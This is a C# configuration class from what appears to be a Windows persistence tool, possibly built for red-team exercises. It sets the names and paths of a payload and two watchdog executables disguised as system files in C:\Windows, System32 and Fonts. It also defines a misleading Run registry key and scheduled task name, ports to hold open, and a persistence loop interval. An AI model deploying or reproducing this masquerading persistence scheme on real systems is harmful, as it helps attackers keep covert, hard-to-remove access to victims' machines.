public class Config // This is for Binary 1
{
    public static bool Debugging { get; private set; } = false ; //Set to true for debugging messages and logs
    public static int sleepTime { get; private set; } = 40000; //decides system usage: The time that the loop sleeps in milliseconds between running all persistence.   
                                                               // used 46 seconds for UB lockdown deploy. Lower time increases the strength of the persistence
    public static int[] PortsToKeepOpen { get; private set; } = new int[] { 80, 443, 53, 5542 }; // Ports to keep open

    public static string RunKeyName { get; private set; } = "Network Information Service";
    public static string ScheduledTaskName { get; private set; } = "IndexSearch";



    public static string PayloadPath { get; private set; } = @"C:\Windows\"; // This will be created if it doesnt already exist
    public static string PayloadName { get; private set; } = "WinLogoff.exe";
    public static string PayloadFullPath { get; private set; } = Path.Combine(PayloadPath, PayloadName);




    public static string SecondaryWatchdogPath { get; private set; } = @"C:\Windows\System32\"; // This will be created if it doesnt already exist
    public static string SecondaryWatchdogName { get; private set; } = "WinSearchIndexer.exe";
    public static string SecondaryWatchdogMutexName { get; private set; } = "SecondaryWDog";
    public static string SecondaryWatchdogFullPath { get; private set; } = Path.Combine(SecondaryWatchdogPath, SecondaryWatchdogName);


    public static string PrimaryWatchdogPath { get; private set; } = @"C:\Windows\Fonts\"; // CRUCIAL: This is the foler you will be put both watchdogs and the payload into
    public static string PrimaryWatchdogName { get; private set; } = "Windows Service Scheduler.exe";
    public static string PrimaryWatchdogMutexName { get; private set; } = "PrimaryWDog";
    public static string PrimaryWatchdogFullPath { get; private set; } = Path.Combine(PrimaryWatchdogPath, PrimaryWatchdogName);
}